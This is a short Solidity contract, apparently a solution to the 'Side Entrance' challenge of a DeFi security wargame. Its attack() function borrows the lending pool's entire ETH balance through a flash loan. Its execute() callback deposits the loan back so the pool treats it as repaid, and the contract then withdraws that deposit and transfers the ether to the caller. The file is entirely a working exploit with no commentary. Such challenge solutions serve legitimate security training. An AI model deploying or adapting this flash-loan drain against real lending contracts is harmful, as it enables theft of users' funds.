// SPDX-License-Identifier: MIT
 pragma solidity 0.8.25;

 import "../side-entrance/SideEntranceLenderPool.sol";
 import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

 contract AttackSideEntrance {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    receive() external payable {}
    
    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable{
        pool.deposit{value: msg.value}();
    }
 }